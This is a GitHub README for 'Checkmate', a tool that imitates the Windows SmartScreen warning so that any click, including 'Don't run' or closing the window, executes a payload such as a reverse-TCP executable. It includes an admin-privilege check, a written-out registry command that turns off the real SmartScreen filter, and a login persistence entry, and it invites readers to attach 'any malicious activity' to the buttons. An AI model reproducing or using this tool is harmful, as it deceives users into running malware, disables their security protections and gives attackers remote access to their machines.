# Checkmate
payload Execution by Fake Windows SmartScreen with requires Administrator privileges &amp; Turn off real SmartScreen Filter

All options allow for the execution of an execution, and this can be used in a different way, such
as opening a port in a Windows machine, or doing it in a different way. can equate the value
of any option to any malicious activity  want.

https://github.com/S3N4T0R-0X0/Checkmate/assets/121706460/d983c635-9340-4894-b3bb-fbfe0b41235a

This exploit allows you to  make payload executeion and create execution of administrator privileges by simulating the Windows Smart Screen by clicking any option in the window such as Don't run or (X) to close the window with stop the real smartscreen filter

1.Payload executeion : def dont_run_action(): = other_command = r'C:\Users\username\ReverseTCP.exe'

2.Administrator privileges : return ctypes.windll.shell32.IsUserAnAdmin()

3.Stop the real smartscreen filter : os.system('reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "EnableSmartScreenFilter" /t REG_DWORD /d "0" /f')

4.The registry entry is intended to run the script (sys.argv[0]) every time the user logs in

![IMG-20231218-WA0001](https://github.com/S3N4T0R-0X0/Checkmate/assets/121706460/89106952-ca8f-45b7-8151-b29e9f0a20ea)


There are some differences in Windows Smart Screen version, such as the background colors of the options,
some of which are blue, and the other dimension has a white background. You can control this by modifying
the script. Also, there are some that contain the word “Don’t run” without “Run anyway”

![Screenshot from 2023-12-18 11-37-59](https://github.com/S3N4T0R-0X0/Checkmate/assets/121706460/d5b5be38-28d1-4bc9-8eb6-da7c9e6261dc)


   
